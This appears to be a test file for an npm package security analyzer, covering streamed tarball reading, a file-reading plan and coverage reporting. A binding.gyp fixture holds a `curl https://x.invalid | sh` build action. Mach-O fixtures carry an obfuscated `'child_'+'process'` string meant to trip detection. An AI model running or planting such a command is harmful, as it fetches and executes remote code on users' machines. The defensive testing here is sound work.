// Reading a tarball as a stream (tarball.ts: TarStream, TarballInflater) gives what readTar gives for the same bytes,
// however they are cut into chunks; the reading plan (score.ts: firstPass, planReading) picks what `analyze` reads
// first; and `analyze` told which files it holds only the first bytes of (`notHeld`) reports every one it reaches as
// skipped, so the analysis is incomplete, and reads every other file exactly as it would from a tarball held whole.
import { describe, expect, test } from "bun:test";
import { gunzipSync } from "node:zlib";
import { chargeOf } from "./scan-charge.ts";
import { elf, machO } from "./executables.ts";
import { analyze, ArchiveError, keptBytes, readingOf, EXECUTABLE_HEAD_BYTES, scanBinaryText, firstPass, hasExecutableMagic, HEAD_BYTES, MAX_ANALYZED_FILE_BYTES, Meter, planReading, readTar, TarballInflater, TarStream, type Analysis, type HoldRule, type TarEntry } from "../src/index.ts";

type Spec = { name: string; data?: Uint8Array | string; type?: string; pax?: string; longName?: string };

const enc = new TextEncoder();
const bytesOf = (d: Uint8Array | string | undefined): Uint8Array => (d instanceof Uint8Array ? d : enc.encode(d ?? ""));

function header(name: string, size: number, type: string): Uint8Array {
  const h = new Uint8Array(512);
  const put = (s: string, at: number): void => h.set(enc.encode(s), at);
  put(name.slice(0, 99), 0);
  put("0000644\0", 100);
  put("0000000\0", 108);
  put("0000000\0", 116);
  put(`${size.toString(8).padStart(11, "0")}\0`, 124);
  put("00000000000\0", 136);
  put("        ", 148);
  put(type, 156);

  // a link names its target, or npm drops the header (refuseDroppedEntry)
  if (type === "1" || type === "2") put("target", 157);
  put("ustar\0", 257);
  put("00", 263);
  put(`${h.reduce((n, b) => n + b, 0).toString(8).padStart(6, "0")}\0 `, 148);

  return h;
}

const pad = (n: number): Uint8Array => new Uint8Array((512 - (n % 512)) % 512);

/** A tar of `specs` (PAX paths, GNU long names, directories and links included), ended by two zero blocks. */
function tar(specs: readonly Spec[]): Uint8Array<ArrayBuffer> {
  const parts: Uint8Array[] = [];

  for (const s of specs) {
    if (s.pax !== undefined) {
      const body = `path=${s.pax}\n`;
      let len = body.length + 3;

      while (`${len} ${body}`.length !== len) len = `${len} ${body}`.length;
      const rec = enc.encode(`${len} ${body}`);
      parts.push(header("PaxHeader", rec.length, "x"), rec, pad(rec.length));
    }

    if (s.longName !== undefined) {
      const n = enc.encode(`${s.longName}\0`);
      parts.push(header("././@LongLink", n.length, "L"), n, pad(n.length));
    }

    const data = bytesOf(s.data);
    parts.push(header(s.name, data.length, s.type ?? "0"), data, pad(data.length));
  }

  parts.push(new Uint8Array(1024));
  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
  let at = 0;

  for (const p of parts) {
    out.set(p, at);
    at += p.length;
  }

  return out;
}

/** A seeded generator, so a failure names the case that made it. */
function rng(seed: number): () => number {
  let s = seed >>> 0 || 1;

  return () => {
    s ^= s << 13;
    s >>>= 0;
    s ^= s >>> 17;
    s ^= s << 5;
    s >>>= 0;

    return s / 2 ** 32;
  };
}

/** `bytes` cut into chunks of 1 to `max` bytes. */
function chunks(bytes: Uint8Array, rand: () => number, max: number): Uint8Array[] {
  const out: Uint8Array[] = [];

  for (let at = 0; at < bytes.length; ) {
    const n = 1 + Math.floor(rand() * max);
    out.push(bytes.slice(at, at + n));
    at += n;
  }

  return out;
}

/** `bytes` read by TarStream in random chunks; nothing is metered (no meter is installed, so nothing is charged). */
function streamTar(bytes: Uint8Array, hold: HoldRule, rand: () => number, max: number): { files: TarEntry[]; notHeld: ReadonlySet<TarEntry> } {
  const t = new TarStream(hold);

  for (const c of chunks(bytes, rand, max)) t.push(c);

  return t.end();
}

function errorOf(fn: () => void): string {
  try {
    fn();

    return "ok";
  } catch (e) {
    return e instanceof ArchiveError ? `${e.kind}: ${e.message}` : `other: ${String(e)}`;
  }
}

/**
 * The same file, in the read and in readTar's: whole when held, else readTar's first HEAD_BYTES, or its first
 * EXECUTABLE_HEAD_BYTES when it starts like an executable (so its structure can be checked, executable.ts).
 */
function expectSame(got: { files: TarEntry[]; notHeld: ReadonlySet<TarEntry> }, want: TarEntry[]): void {
  expect(got.files.map((f) => [f.path, f.size, f.mode])).toEqual(want.map((f) => [f.path, f.size, f.mode]));
  got.files.forEach((f, i) => {
    const w = want[i]?.data ?? new Uint8Array();

    const head = hasExecutableMagic(w) ? EXECUTABLE_HEAD_BYTES : HEAD_BYTES;

    expect(Buffer.from(f.data).equals(Buffer.from(got.notHeld.has(f) ? w.subarray(0, head) : w))).toBe(true);
  });
}

const SPECS: Spec[] = [
  { name: "package/package.json", data: '{"name":"x","version":"1.0.0"}' },
  { name: "package/lib", type: "5" },
  { name: "package/lib/a.js", data: "module.exports = require('./b');\n" },
  { name: "package/lib/b.js", data: "x".repeat(512) },
  { name: "package/lib/c.js", data: "y".repeat(513) },
  { name: "package/empty.js", data: "" },
  { name: "package/link", type: "2" },
  { name: "ignored", pax: `package/${"deep/".repeat(40)}pax.js`, data: "pax" },
  { name: "ignored", longName: `package/${"long/".repeat(30)}gnu.js`, data: "gnu" },
  { name: "package/bin.node", data: new Uint8Array([0x7f, 0x45, 0x4c, 0x46, ...Array.from({ length: 3000 }, () => 7)]) },
  // past EXECUTABLE_HEAD_BYTES: an unheld one keeps only that much
  { name: "package/lib/tool", data: new Uint8Array([0xcf, 0xfa, 0xed, 0xfe, ...Array.from({ length: 70_000 }, (_, i) => i % 251)]) },
  // a magic of three bytes and a size of three: nothing to grow
  { name: "package/lib/short", data: new Uint8Array([0xcf, 0xfa, 0xed]) },
];

describe("TarStream reads what readTar reads", () => {
  const bytes = tar(SPECS);
  const want = readTar(bytes);

  test("on 300 random chunkings and hold rules", () => {
    for (let seed = 1; seed <= 300; seed++) {
      const rand = rng(seed);
      const holds = new Map<string, boolean>();

      const hold: HoldRule = ({ path }) => {
        const h = holds.get(path) ?? rand() < 0.5;
        holds.set(path, h);

        return h ? "hold" : "head";
      };

      expectSame(streamTar(bytes, hold, rand, seed % 3 === 0 ? 7 : 2000), want);
    }
  });

  test("with every byte its own chunk", () => {
    expectSame(streamTar(bytes, () => "hold", () => 0, 1), want);
  });

  test("refuses what readTar refuses, with its words", () => {
    // a broken checksum, a size that is not octal, an entry cut short, a malformed PAX record
    const broken = bytes.slice();
    // a byte of the second header (lib/, at 1024)
    broken[1030] = (broken[1030] ?? 0) ^ 0xff;
    const badSize = tar([{ name: "package/a.js", data: "1" }]);
    badSize.set(enc.encode("99999999999\0"), 124);
    // inside lib/a.js's data: its header is the third, at byte 1536 (a cut inside a header is ignored, by both)
    const cut = bytes.slice(0, 2048 + 10);
    const pax = tar([{ name: "package/a.js", data: "1" }]);
    const rec = enc.encode("5 x\n");
    const paxBad = new Uint8Array([...header("PaxHeader", rec.length, "x"), ...rec, ...pad(rec.length), ...pax]);

    for (const input of [broken, badSize, cut, paxBad]) {
      const viaStream = errorOf(() => {
        const t = new TarStream(() => "hold");

        for (const c of chunks(input, rng(9), 300)) t.push(c);
        t.end();
      });

      expect(viaStream).toBe(
        errorOf(() => {
          readTar(input);
        }),
      );
      expect(viaStream).not.toBe("ok");
    }
  });

  test("a file the rule looks at is seen whole, then kept to its head", () => {
    const seen = new Map<string, string>();

    const t = new TarStream(
      ({ path }) => (path === "lib/c.js" ? "look" : path === "lib/a.js" ? "hold" : "head"),
      (f, b) => {
        seen.set(f.path, new TextDecoder().decode(b));
      },
    );

    for (const c of chunks(bytes, rng(3), 50)) t.push(c);
    const got = t.end();

    expect([...seen.keys()]).toEqual(["lib/a.js", "lib/c.js"]);
    expect(seen.get("lib/c.js")).toBe("y".repeat(513));
    expect(got.files.find((f) => f.path === "lib/c.js")?.data.length).toBe(HEAD_BYTES);
    expect(got.notHeld.has(got.files.find((f) => f.path === "lib/c.js") ?? got.files[0]!)).toBe(true);
  });
});

async function inflate(tgz: Uint8Array, hold: HoldRule, opts: { maxUnpackedBytes?: number; work?: number } = {}): Promise<Awaited<ReturnType<TarballInflater["end"]>>> {
  const inf = new TarballInflater({ hold, maxUnpackedBytes: opts.maxUnpackedBytes ?? 512 * 1024 * 1024, meter: new Meter(opts.work ?? 1e12) });

  for (const c of chunks(tgz, rng(5), 4096)) await inf.push(new Uint8Array(c));

  return inf.end();
}

describe("TarballInflater", () => {
  const tgz = Bun.gzipSync(tar(SPECS));

  test("inflates and reads what readTar reads after gunzip", async () => {
    const got = await inflate(tgz, () => "hold");

    if (got.kind !== "read") throw new Error(got.kind);
    expectSame(got.tarball, readTar(new Uint8Array(gunzipSync(tgz))));
  });

  test("refuses bytes that are not gzip, a stream cut short, and more than it may inflate", async () => {
    const notGzip = await inflate(new Uint8Array(4096).fill(65), () => "hold");
    const cut = await inflate(tgz.slice(0, tgz.length - 20), () => "hold");
    const big = await inflate(Bun.gzipSync(tar([{ name: "package/a.txt", data: "0".repeat(200_000) }])), () => "head", { maxUnpackedBytes: 100_000 });

    expect([notGzip.kind, cut.kind, big.kind]).toEqual(["refused", "refused", "refused"]);
    expect(big.kind === "refused" && big.error.kind).toBe("too-large");
  });

  test("a spent meter stops it, and pushes after a failure do nothing", async () => {
    const got = await inflate(Bun.gzipSync(tar([{ name: "package/a.txt", data: "0".repeat(400_000) }])), () => "hold", { work: 1000 });

    expect(got.kind).toBe("spent");
  });
});

// ---------- the plan, and `analyze` over files it does not hold ----------

function entry(path: string, data: Uint8Array | string): TarEntry {
  const d = bytesOf(data);

  return { path, size: d.length, mode: 0o644, data: d };
}

/** `files` with the ones `drop` names cut to their first bytes, as a streamed read that did not hold them leaves them. */
function withoutHolding(files: readonly TarEntry[], drop: (f: TarEntry) => boolean) {
  const notHeld = new Set<TarEntry>();

  const out = files.map((f) => {
    if (!drop(f)) return f;
    const cut = { ...f, data: f.data.slice(0, HEAD_BYTES) };
    notHeld.add(cut);

    return cut;
  });

  return { files: out, notHeld };
}

const manifest = { name: "pkg", version: "1.0.0", license: "MIT", main: "index.js", scripts: { postinstall: "node scripts/setup.js" } };

const PKG: TarEntry[] = [
  entry("package.json", JSON.stringify(manifest)),
  entry("index.js", "const a = require('./lib/a');\nmodule.exports = a;\n"),
  entry("lib/a.js", "module.exports = require('./b.js');\n"),
  entry("lib/b.js", "module.exports = 2;\n"),
  entry("scripts/setup.js", "console.log('setup');\n"),
  entry("other/unreached.js", "module.exports = 3;\n"),
  entry("README.md", "# pkg\n"),
  entry("assets/logo.png", new Uint8Array([0x89, 0x50, 0x4e, 0x47, ...Array.from({ length: 5000 }, () => 1)])),
  entry("prebuilt/addon.node", new Uint8Array([0x7f, 0x45, 0x4c, 0x46, ...Array.from({ length: 5000 }, () => 2)])),
];

const run = (files: readonly TarEntry[], notHeld?: ReadonlySet<TarEntry>, maxScannedBytes?: number): Analysis =>
  analyze({ name: "pkg", manifest, files, notHeld, publisher: "a", previousPublishers: [], maxScannedBytes });

const incompleteOf = (a: Analysis): string[] => a.signals.find((s) => s.id === "incomplete")?.evidence ?? [];

describe("analyze over a streamed read", () => {
  test("files it never reads (binaries, images, an unreached readme) are the same held or not: the analysis is identical", () => {
    const { files, notHeld } = withoutHolding(PKG, (f) => /\.(?:node|png|md)$/.test(f.path));

    expect(JSON.stringify(run(files, notHeld))).toBe(JSON.stringify(run(PKG)));
    // with no read of their text, a native module and an image stay as production left them, never read: complete
    expect(run(files, notHeld).coverage).toEqual({ kind: "complete" });
  });

  test("a reached file it does not hold is skipped, never read from its head, and makes coverage partial", () => {
    const { files, notHeld } = withoutHolding(PKG, (f) => f.path === "lib/b.js");
    const a = run(files, notHeld);

    expect(a.skipped).toContainEqual({ path: "lib/b.js", size: PKG[3]?.size ?? 0, reason: "over-budget" });
    expect(a.coverage).toEqual({ kind: "partial", omittedFiles: 1, omittedBytes: PKG[3]?.size ?? 0, reasons: ["over-budget"], notes: [] });
    // a size or budget omission costs no points (apm-score-v11)
    expect(incompleteOf(a)).toEqual([]);
  });

  test("an unreached file it does not hold is counted as not read, and coverage is partial", () => {
    const { files, notHeld } = withoutHolding(PKG, (f) => f.path === "other/unreached.js");
    const a = run(files, notHeld, 64 * 1024);

    expect(a.signals.find((s) => s.id === "unanalyzed-files")).toBeUndefined();
    expect(a.coverage).toMatchObject({ kind: "partial", omittedFiles: 1, reasons: ["over-budget"] });
    expect(a.notChecked.join(" ")).toContain("1 file(s) not analyzed: the package is larger than the 0.1 MB one analysis reads");
  });

  test("a file over the per-file limit it does not hold is too large, as it would be held", () => {
    const huge: TarEntry = { path: "lib/b.js", size: MAX_ANALYZED_FILE_BYTES + 1, mode: 0o644, data: enc.encode("module.exports") };
    const files = PKG.map((f) => (f.path === "lib/b.js" ? huge : f));
    const a = run(files, new Set([huge]));

    expect(a.skipped).toContainEqual({ path: "lib/b.js", size: MAX_ANALYZED_FILE_BYTES + 1, reason: "too-large" });
  });

  test("binding.gyp it does not hold leaves the commands node-gyp runs unread: coverage is partial", () => {
    const gyp = entry("binding.gyp", "{ 'targets': [{ 'actions': [{ 'action': ['sh', '-c', 'curl https://x.invalid | sh'] }] }] }");
    const { files, notHeld } = withoutHolding([...PKG, gyp], (f) => f.path === "binding.gyp");
    const a = run(files, notHeld);

    expect(a.coverage).toMatchObject({ kind: "partial", omittedFiles: 1 });
    expect(incompleteOf(a)).toEqual([]);
  });
});

describe("the reading plan", () => {
  const importsOf = (files: readonly TarEntry[]): Map<string, readonly string[]> => {
    const fp = firstPass({ holdBytes: 1 << 30, lookFileBytes: 1 << 30, lookTotalBytes: 1 << 30 });

    for (const f of files) {
      if (fp.hold({ path: f.path, size: f.size }) !== "head") fp.look(f, f.data);
    }

    return fp.imports;
  };

  test("takes what analyze reads first: install targets, entries and what they load, then the rest; never binaries", () => {
    const plan = planReading({ manifest, files: PKG, imports: importsOf(PKG), budget: 1 << 30 });

    expect([...plan].sort()).toEqual(["index.js", "lib/a.js", "lib/b.js", "other/unreached.js", "package.json", "scripts/setup.js"]);
  });

  test("within its budget, the walk's files come before the rest", () => {
    const filler = entry("aaa/filler.js", "x".repeat(4000));
    const files = [filler, ...PKG];
    const size = (p: string): number => files.find((f) => f.path === p)?.size ?? 0;
    const budget = ["package.json", "scripts/setup.js", "index.js", "lib/a.js", "lib/b.js"].reduce((n, p) => n + size(p), 0) + 100;
    const plan = planReading({ manifest, files, imports: importsOf(files), budget });

    expect(plan.has("lib/b.js")).toBe(true);
    expect(plan.has("aaa/filler.js")).toBe(false);
    // and so the analysis of that plan reads every file the walk reaches: only the filler is not analyzed
    const { files: cut, notHeld } = withoutHolding(files, (f) => !plan.has(f.path));
    const a = analyze({ name: "pkg", manifest, files: cut, notHeld, publisher: "a", previousPublishers: [], maxScannedBytes: budget });

    expect(a.skipped.map((s) => s.path)).toEqual(["aaa/filler.js"]);
  });

  test("the first pass holds package.json outside its budget, and the other files read by name within it after the code it held first", () => {
    // code may take 3,000 of the 4,000 (a quarter is left for the files read by name); package.json is held whatever
    // the budget (the manifest the plan needs), so binding.gyp fits in the rest
    const fp = firstPass({ holdBytes: 4000, lookFileBytes: 1 << 20, lookTotalBytes: 1 << 30 });

    const kinds = [
      fp.hold({ path: "a.js", size: 2000 }),
      fp.hold({ path: "b.js", size: 2000 }),
      fp.hold({ path: "package.json", size: 1800 }),
      fp.hold({ path: "binding.gyp", size: 500 }),
      fp.hold({ path: "huge.js", size: 2 << 20 }),
      fp.hold({ path: "x.node", size: 10 }),
    ];

    expect(kinds).toEqual(["hold", "look", "hold", "hold", "head", "head"]);
    // and with a budget of one byte, package.json still
    expect(firstPass({ holdBytes: 1, lookFileBytes: 1 << 20, lookTotalBytes: 1 << 30 }).hold({ path: "package.json", size: 1800 })).toBe("hold");
  });
});

// Round 11 review of ee69d23: a streamed read read the text of every binary it did not hold as it passed, files
// production (274d284) never read (its plan held a Mach-O like any text file, within its budget, and left the rest
// unread), and three of them ended the isolate. A streamed read now keeps nothing of a file it does not hold; the plan
// holds a Mach-O as production's did, and the analysis reads that one whole. Round 9 review, P2: a file the views'
// budget leaves out is reported at its size.
describe("binaries in a streamed read, as production read them", () => {
  const tail = enc.encode(`\n${"'child_'+'process';\n".repeat(200)}`);
  const binaries = Array.from({ length: 12 }, (_, i) => ({ name: `lib/b${String(i).padStart(2, "0")}`, data: machO({ size: EXECUTABLE_HEAD_BYTES + 4096, tail }) }));
  // each larger than the head a streamed read keeps of a Mach-O it does not hold
  const SIZE = binaries[0]!.data.length;
  const pkg = { name: "pkg", version: "1.0.0", license: "MIT" };
  const bytes = tar([{ name: "package/package.json", data: JSON.stringify(pkg) }, ...binaries.map((b) => ({ name: `package/${b.name}`, data: b.data }))]);

  const read = (hold: HoldRule) => {
    const t = new TarStream(hold);

    for (const c of chunks(bytes, rng(9), 4096)) t.push(c);

    return t.end();
  };

  test("one the read did not hold is unread at its size, its text never read: the reading is partial", () => {
    const got = read(({ path }) => (path === "package.json" ? "hold" : "head"));

    expect(got.files.find((f) => f.path === binaries[0]!.name)?.data.length).toBe(EXECUTABLE_HEAD_BYTES);
    const a = analyze({ name: "pkg", manifest: pkg, files: got.files, notHeld: got.notHeld, publisher: "a", previousPublishers: [] });

    expect(a.coverage).toMatchObject({ kind: "partial", omittedFiles: 12, omittedBytes: 12 * SIZE });
    // nothing of their text was read
    expect(a.signals.find((s) => s.id === "obfuscated")).toBeUndefined();
  });

  test("one the read held is read whole, as the same file in a tarball held whole is", () => {
    const got = read(() => "hold");
    const streamed = analyze({ name: "pkg", manifest: pkg, files: got.files, notHeld: got.notHeld, publisher: "a", previousPublishers: [] });
    const whole = analyze({ name: "pkg", manifest: pkg, files: readTar(bytes), publisher: "a", previousPublishers: [] });

    expect(JSON.stringify(streamed)).toBe(JSON.stringify(whole));
    expect(streamed.signals.find((s) => s.id === "obfuscated")).toBeDefined();
  });

  test("the plan holds a Mach-O in its turn and within its budget, as production's held it; never an ELF file or a native name", () => {
    const linux = entry("lib/linux-tool", elf({ size: 4096 }));
    const addon = entry("lib/addon.node", binaries[0]!.data);
    const files = [entry("package.json", JSON.stringify(pkg)), ...binaries.slice(0, 3).map((b) => entry(b.name, b.data)), linux, addon];
    const plan = planReading({ manifest: pkg, files, imports: new Map(), budget: 1 << 30 });

    expect([...plan].sort()).toEqual(["lib/b00", "lib/b01", "lib/b02", "package.json"]);
    // room for two: the third is passed over, as production's plan passed it over
    const two = planReading({ manifest: pkg, files, imports: new Map(), budget: 2 * SIZE + 600 });

    expect([...two].sort()).toEqual(["lib/b00", "lib/b01", "package.json"]);
  });

  // round 12 review of 7cd0b2b, P2: a view past the budget was dropped and its file reported unread for the budget
  test("held views past the analysis's budget keep their signals, and the analysis says it did not finish", () => {
    const one = scanBinaryText(binaries[0]!.data);
    const each = one.kind === "read" ? keptBytes({ findings: one.findings, facts: one.facts }) : 0;
    const a = analyze({ name: "pkg", manifest: pkg, files: readTar(bytes), publisher: "a", previousPublishers: [], maxKeptViewBytes: each + chargeOf(binaries[0]!.data) + each / 2 });
    const whole = analyze({ name: "pkg", manifest: pkg, files: readTar(bytes), publisher: "a", previousPublishers: [] });

    expect(a.coverage).toEqual({ kind: "complete" });
    const stopped = a.signals.find((s) => s.id === "incomplete");

    expect((stopped?.evidence.length ?? 0) + (stopped?.more?.length ?? 0)).toBe(10);
    expect(readingOf(a).kind).toBe("incomplete");
    // every signal the whole reading found, and incomplete besides
    expect(a.signals.map((s): string => s.id).filter((id) => id !== "incomplete")).toEqual(whole.signals.map((s): string => s.id));
  });
});
